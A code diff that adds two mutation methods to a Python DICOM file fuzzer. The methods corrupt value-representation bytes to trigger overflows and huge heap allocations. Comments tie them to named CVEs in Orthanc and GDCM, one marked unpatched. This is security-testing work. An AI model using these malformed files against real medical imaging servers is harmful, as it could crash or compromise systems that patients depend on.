@@ -575,6 +575,8 @@ class StructureFuzzer(FormatFuzzerBase):
             self._binary_null_vr,
             self._binary_dash_vr,
             self._binary_vr_un_substitution,
+            self._binary_dimension_vr_ul,
+            self._binary_nonstandard_vr_meta,
         ]
         num = random.randint(1, 2)
         selected = random.sample(binary_attacks, num)
@@ -857,3 +859,74 @@ class StructureFuzzer(FormatFuzzerBase):
         elem_start, _, _, _ = random.choice(candidates)
         vr_offset = elem_start + 4
         return self._overwrite_vr_bytes(file_data, vr_offset, b"UN")
+
+    def _binary_dimension_vr_ul(self, file_data: bytes) -> bytes:
+        """Replace VR "US" with "UL" on a Rows or Columns tag.
+
+        Orthanc CVE-2026-5442. US is a 2-byte unsigned short; UL is a
+        4-byte unsigned long. Both are short-VR (2-byte length field in
+        Explicit VR LE), so the length encoding is unchanged. But the
+        parser now interprets the 2-byte value as the first half of a
+        4-byte integer, reading 2 bytes from the next element as the
+        high word. The resulting huge dimension overflows the frame-size
+        calculation (rows * cols * bytes_per_pixel).
+        """
+        if not self._is_valid_dicom(file_data):
+            return file_data
+        # Scan for Rows (0028,0010) or Columns (0028,0011) with VR "US"
+        rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) LE
+        cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) LE
+        targets = []
+        for tag_bytes in (rows_tag, cols_tag):
+            idx = file_data.find(tag_bytes, _DATA_OFFSET)
+            if idx >= 0 and idx + 6 <= len(file_data):
+                vr = file_data[idx + 4 : idx + 6]
+                if vr == b"US":
+                    targets.append(idx + 4)
+        if not targets:
+            return file_data
+        vr_offset = random.choice(targets)
+        return self._overwrite_vr_bytes(file_data, vr_offset, b"UL")
+
+    def _binary_nonstandard_vr_meta(self, file_data: bytes) -> bytes:
+        """Replace a group 0002 element's VR with a fabricated string "ZZ".
+
+        GDCM CVE-2026-3650 (UNPATCHED). Non-standard VR types in file
+        meta information cause parsers to fall back to VR-implied length
+        rules. "ZZ" is not in any VR table, so the parser may treat it
+        as a long-VR (reading 6 extra bytes as reserved+length) or
+        allocate based on a garbage length value. A ~150-byte file with
+        this pattern caused GDCM to allocate ~4.2 GB of heap.
+
+        Note: the standard _parse_dicom_elements helper skips group
+        0002 elements, so this attack scans for them independently.
+        """
+        if not self._is_valid_dicom(file_data):
+            return file_data
+        # Walk group 0002 elements manually to find one with a valid VR
+        pos = _DATA_OFFSET
+        data_len = len(file_data)
+        candidates = []
+        while pos + 8 <= data_len:
+            group = int.from_bytes(file_data[pos : pos + 2], "little")
+            if group != 0x0002:
+                break  # past file meta
+            vr = file_data[pos + 4 : pos + 6]
+            # Skip if already non-ASCII (already corrupted)
+            if vr.isalpha() and vr.isupper():
+                candidates.append(pos + 4)
+            # Advance past this element
+            if vr in _LONG_VRS:
+                if pos + 12 > data_len:
+                    break
+                length = int.from_bytes(file_data[pos + 8 : pos + 12], "little")
+                pos += 12 + length
+            else:
+                if pos + 8 > data_len:
+                    break
+                length = int.from_bytes(file_data[pos + 6 : pos + 8], "little")
+                pos += 8 + length
+        if not candidates:
+            return file_data
+        vr_offset = random.choice(candidates)
+        return self._overwrite_vr_bytes(file_data, vr_offset, b"ZZ")
